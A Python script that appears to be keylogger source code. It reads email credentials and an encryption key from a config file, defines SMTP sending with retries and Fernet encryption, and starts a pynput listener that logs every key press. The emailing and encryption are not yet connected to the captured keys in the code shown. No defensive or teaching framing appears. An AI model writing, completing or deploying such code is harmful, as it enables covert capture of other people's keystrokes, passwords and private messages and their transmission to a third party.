import os
import sys
import time
import smtplib
import configparser
import logging
from cryptography.fernet import Fernet, InvalidToken
from pynput.keyboard import Key, Listener
from typing import Dict, Any
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)
# Configuration management
CONFIG_FILE = 'config.ini'
MAX_RETRIES = 3
RETRY_DELAY = 5
def load_config() -> Dict[str, Any]:
    """Load and validate configuration from file.
    Returns:
        Dictionary containing validated configuration sections
    Raises:
        FileNotFoundError: If config file is missing
        ValueError: For invalid configuration values
    """
    config = configparser.ConfigParser()
    try:
        if not os.path.exists(CONFIG_FILE):
            raise FileNotFoundError(f"Config file {CONFIG_FILE} not found")
        config.read(CONFIG_FILE)
        # Validate required sections exist
        for section in ['email', 'logging', 'encryption']:
            if section not in config:
                raise ValueError(f"Missing required section: {section}")
        # Validate email configuration
        if not all(config.get('email', field) for field in ['from', 'to', 'password', 'smtp_server']):
            raise ValueError("Missing required email configuration fields")
        # Validate logging directory is specified
        if not config.get('logging', 'dir'):
            raise ValueError("Logging directory not specified")
        return {
            'email': {
                'from': config.get('email', 'from'),
                'to': config.get('email', 'to'),
                'password': config.get('email', 'password'),
                'smtp_server': config.get('email', 'smtp_server'),
                'smtp_port': config.getint('email', 'smtp_port', fallback=587)
            },
            'logging': {
                'dir': config.get('logging', 'dir'),
                'file': config.get('logging', 'file', fallback='activity.log')
            },
            'encryption': {
                'key': config.get('encryption', 'key')
            }
        }
    except Exception as e:
        logger.error(f"Failed to load configuration: {e}")
        raise
def setup_directories(log_dir: str) -> None:
    """Ensure required directories exist with proper permissions.
    Args:
        log_dir: Path to logging directory
    Raises:
        OSError: If directory creation fails
    """
    try:
        if not os.path.exists(log_dir):
            os.makedirs(log_dir, mode=0o700)
            logger.info(f"Created directory: {log_dir}")
    except Exception as e:
        logger.error(f"Failed to create directory {log_dir}: {e}")
        raise
def send_email(config: Dict[str, Any], subject: str, body: str) -> bool:
    """Send email with the provided content.
    Args:
        config: Email configuration dictionary
        subject: Email subject
        body: Email body content
    Returns:
        bool: True if email was sent successfully
    """
    msg = MIMEMultipart()
    msg['From'] = config['from']
    msg['To'] = config['to']
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))
    for attempt in range(MAX_RETRIES):
        try:
            with smtplib.SMTP(config['smtp_server'], config['smtp_port']) as server:
                server.starttls()
                server.login(config['from'], config['password'])
                server.send_message(msg)
                logger.info("Email sent successfully")
                return True
        except Exception as e:
            logger.warning(f"Email send attempt {attempt + 1} failed: {e}")
            if attempt < MAX_RETRIES - 1:
                time.sleep(RETRY_DELAY)
    logger.error("All email send attempts failed")
    return False
def encrypt_data(data: str, key: str) -> str:
    """Encrypt data using Fernet symmetric encryption.
    Args:
        data: String data to encrypt
        key: Base64-encoded encryption key
    Returns:
        Encrypted data as string
    """
    try:
        fernet = Fernet(key.encode())
        return fernet.encrypt(data.encode()).decode()
    except (InvalidToken, ValueError) as e:
        logger.error(f"Encryption failed: {e}")
        raise
def on_press(key):
    """Callback for keyboard key press events."""
    try:
        logger.info(f"Key pressed: {key}")
    except Exception as e:
        logger.error(f"Error logging key press: {e}")
def main():
    """Main application entry point."""
    try:
        config = load_config()
        setup_directories(config['logging']['dir'])
        # Example usage
        encrypted = encrypt_data("test data", config['encryption']['key'])
        logger.info(f"Encrypted test: {encrypted}")
        # Start keyboard listener
        with Listener(on_press=on_press) as listener:
            listener.join()
    except Exception as e:
        logger.critical(f"Application failed: {e}")
        sys.exit(1)
if __name__ == "__main__":
    main()